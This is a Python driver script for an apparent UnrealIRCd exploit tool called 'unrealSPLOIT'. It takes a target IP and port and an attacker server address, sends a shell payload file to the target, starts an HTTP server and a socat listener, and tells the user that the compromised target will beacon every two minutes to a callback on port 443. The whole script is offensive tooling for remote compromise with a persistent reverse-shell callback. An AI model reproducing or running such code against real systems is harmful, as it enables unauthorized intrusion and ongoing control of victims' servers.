import argparse
from anColor import anColor as colors
import sploitClass
import time
import sys
#from sploitClass import *

sploit = sploitClass.unreal()

class unrealSploit:
    
    def __init__(self):
        pass

    def run(self):
        # colors, cause...ya know...we're cool and stuff
        c = colors()
        good = "[" + c.cyan + "+" + c.endc + "] "
        blue = "[" + c.blue + "+" + c.endc + "] "
        green = "[" + c.green + "+" + c.endc + "] "
        warn = "[" + c.warn + "!" + c.endc + "] "
        fail = "[" + c.fail + "-" + c.endc + "] "

        # and why not just make it hella 1337?
        print(c.blue + "\n====================================================================" + c.endc)
        print(c.blue + "                             _ ___________ _     _____ _____ _____  " + c.endc)
        print(c.blue + "                            | /  ___| ___ \ |   |  _  |_   _|_   _| " + c.endc)
        print(c.blue + "  _   _ _ __  _ __ ___  __ _| \ `--.| |_/ / |   | | | | | |   | |   " + c.endc)
        print(c.blue + " | | | | '_ \| '__/ _ \/ _` | |`--. \  __/| |   | | | | | |   | |   " + c.endc)
        print(c.blue + " | |_| | | | | | |  __/ (_| | /\__/ / |   | |___\ \_/ /_| |_  | |   " + c.endc)
        print(c.blue + "  \__,_|_| |_|_|  \___|\__,_|_\____/\_|   \_____/\___/ \___/  \_/   " + c.endc)
        print(c.blue + "====================================================================\n" + c.endc)
        time.sleep(2)

        # setup the arguement parser
        parser = argparse.ArgumentParser()
        parser.add_argument('-t', '--target', help='target ip', required=True)
        parser.add_argument('-p', '--port', help='target port', type=int, required=True)
        parser.add_argument('-s', '--server', help='server socket address', required=True)
        args = parser.parse_args()

        if sys.argv[1:] is None:
            print("Must specify local ip and port to pickup payload")
            sys.exit(1)

        servSock = args.server
        splits = servSock.split(":")
        servip = splits[0]
        servPort = splits[1]

        sploit.sock(args.target, args.port)
        sploit.plugVals(servSock, servip, servPort)
        with open("deliveryManfixed.sh", 'rb') as sploits:
            delivery = sploits.read()
        sendMe = sploit.initCat(delivery)
        sploit.sendSploit(sendMe, args.target, args.port)
        sploit.httpServ(servPort)
        sploit.socatListen()
        sploit.postProcess()

        # finish up end exit - easy listener script provided: socatch.sh
        print(green + "All done, exiting now.")
        print("\nTarget will begin beaconing every 2 minutes.")
        print("Start your socat listener to catch the callback on 443.\n")
        sys.exit(0)

def main():
    unrealSploit().run()
